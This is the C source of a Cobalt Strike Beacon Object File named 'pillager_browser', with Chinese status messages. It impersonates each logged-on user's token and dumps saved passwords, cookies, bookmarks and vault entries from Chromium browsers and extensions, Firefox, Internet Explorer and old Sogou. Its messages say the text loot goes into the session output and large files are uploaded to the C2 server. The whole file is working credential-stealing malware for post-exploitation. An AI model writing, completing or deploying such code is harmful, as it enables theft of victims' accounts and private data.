#include "plg_common.h"

void go(char *args, int alen) {
	PlgSession sess[PLG_SESS_MAX];
	datap parser;
	int mask = 0xFFFFFFFF;
	int n, i;

	PLG_heap = KERNEL32$GetProcessHeap();
	BeaconDataParse(&parser, args, alen);
	if (parser.length >= 4)
		mask = BeaconDataInt(&parser);

	if (plg_collect_sessions(sess, PLG_SESS_MAX, &n) < 0) {
		BeaconPrintf(CALLBACK_ERROR, "[-] plg_collect_sessions");
		return;
	}

	BeaconPrintf(CALLBACK_OUTPUT,
	    "[*] pillager_browser — Chromium+扩展 / Firefox / IE(Vault+URL+收藏) / OldSogou | mask=0x%x | 会话=%d",
	    (unsigned)mask, n);

	for (i = 0; i < n; i++) {
		const char *pfx = sess[i].user_tag[0] ? sess[i].user_tag : NULL;
		if (sess[i].token && plg_session_impersonate(&sess[i]) < 0) {
			BeaconPrintf(CALLBACK_OUTPUT, "[-] 模拟失败，跳过: %s", sess[i].user_tag);
			continue;
		}
		if (mask & PLG_MASK_CHROMIUM)
			plg_process_all_chromium(sess[i].local, sess[i].appdata, pfx);
		if (mask & PLG_MASK_FIREFOX)
			plg_process_firefox(sess[i].appdata, pfx);
		if (mask & PLG_MASK_IE)
			plg_ie_dump(pfx);
		if (mask & PLG_MASK_OLDSOGOU)
			plg_oldsogou_dump(sess[i].appdata, pfx);
		if (sess[i].token)
			plg_session_revert();
	}

	plg_session_close_all(sess, n);
	BeaconPrintf(CALLBACK_OUTPUT,
	    "[*] 本轮完成。上文 [+] 行为各模块采集摘要；口令/Cookie/书签等文本亦在本会话输出；"
	    "大文件已通过 AxDownloadMemory 上传——请在 C2「下载」查看对应文件名。");
	BeaconPrintf(CALLBACK_OUTPUT, "[*] done");
}
